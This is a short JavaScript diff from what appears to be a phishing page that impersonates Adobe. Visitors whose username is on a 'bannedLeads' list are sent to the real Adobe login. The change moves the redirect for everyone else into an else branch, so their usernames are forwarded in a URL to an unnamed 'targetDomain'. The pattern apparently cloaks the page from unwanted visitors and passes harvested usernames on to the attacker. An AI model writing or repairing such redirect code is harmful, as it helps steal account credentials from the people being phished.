@@ -49,9 +49,11 @@
 
           if (bannedLeads.includes(u)) {
             window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+          } else {
+            window.location = targetDomain + "?username=" + u;
           }
           
-          window.location = targetDomain + "?username=" + u;
+          
         } else {
           window.location = targetDomain;
         }
